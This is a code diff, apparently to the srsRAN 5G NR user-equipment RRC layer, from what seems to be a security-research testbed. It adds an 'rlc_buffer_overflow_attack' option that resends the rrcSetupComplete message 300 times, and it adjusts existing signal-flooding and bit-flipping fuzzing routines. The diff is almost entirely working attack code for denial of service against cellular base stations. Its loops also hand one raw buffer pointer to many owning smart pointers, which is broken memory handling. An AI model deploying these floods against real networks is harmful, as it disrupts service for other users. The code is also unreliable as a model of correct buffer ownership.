@@ -140,11 +140,13 @@ void rrc_nr::get_metrics(rrc_nr_metrics_t& m)
   m.state = state;
 }
 
+
 void rrc_nr::get_RLC_metrics(mux_nr& RLC_mem)
 {
   rlc_pdu_len = RLC_mem.get_RLC_PDU_len();
   mac_buff_rem_space = RLC_mem.get_MAC_rem_buffer_space_len();
 }
+
 
 const char* rrc_nr::get_rb_name(uint32_t lcid)
 {
@@ -682,11 +684,16 @@ void rrc_nr::send_ul_ccch_msg(const asn1::rrc_nr::ul_ccch_msg_s& msg)
     return;
   }
 
+  if (args.rlc_buffer_overflow_attack == "rrcSetupComplete" ){
+    rlc->write_sdu(lcid, std::move(rlc_buffer_overflow_attack_ccch(lcid, std::move(pdu), msg_name)));
+    return;
+  }
+
   rlc->write_sdu(lcid, std::move(pdu));
 }
 
 srsran::unique_byte_buffer_t rrc_nr::signal_flood_ccch(uint32_t lcid, srsran::unique_byte_buffer_t pdu, std::string msg_name){
-  for (uint16_t i = 0; i < 300; i++)
+  for (uint16_t i = 0; i < 10; i++)
   {
     srsran::unique_byte_buffer_t new_buffer(pdu.get());
     std::cout << "Singal flooding message: " << std::endl
@@ -699,14 +706,25 @@ srsran::unique_byte_buffer_t rrc_nr::signal_flood_ccch(uint32_t lcid, srsran::un
   return std::move(pdu);
 }
 
+
+srsran::unique_byte_buffer_t rrc_nr::rlc_buffer_overflow_attack_ccch(uint32_t lcid, srsran::unique_byte_buffer_t pdu, std::string msg_name){
+  for (uint16_t i = 0; i < 300; i++)
+  {
+    srsran::unique_byte_buffer_t new_buffer(pdu.get());
+    std::cout << "Buffer Overflow Attack: " << std::endl
+                << "\tRLC pdu length: " << rlc_pdu_len<< std::endl
+                << "MAC Buffer remaining space: " << mac_buff_rem_space << std::endl;
+    rlc->write_sdu(lcid, std::move(new_buffer));
+  }
+  return std::move(pdu);
+}
+
 srsran::unique_byte_buffer_t rrc_nr::fuzz_ccch_msg(srsran::unique_byte_buffer_t pdu, const asn1::rrc_nr::ul_ccch_msg_s msg, std::string msg_name){
   std::cout << "Fuzzing message: " << std::endl
               << "\tMessage Type: " << msg_name << std::endl
               << "\taddress: " << pdu.get()  << std::endl
               << "\tMsg length(bytes): " << pdu->N_bytes << std::endl
-              << "\tfuzzing bits: " << args.sdu_fuzzed_bits << std::endl
-              << "RLC PDU size: "<< rlc_pdu_len<<std::endl
-              << "MAC Buffer remaining space: " << mac_buff_rem_space << std::endl;
+              << "\tfuzzing bits: " << args.sdu_fuzzed_bits << std::endl;
 
   for (uint32_t i = 0; i < args.sdu_fuzzed_bits; ++i) {
         uint32_t byte_to_flip = std::rand() % pdu->N_bytes;
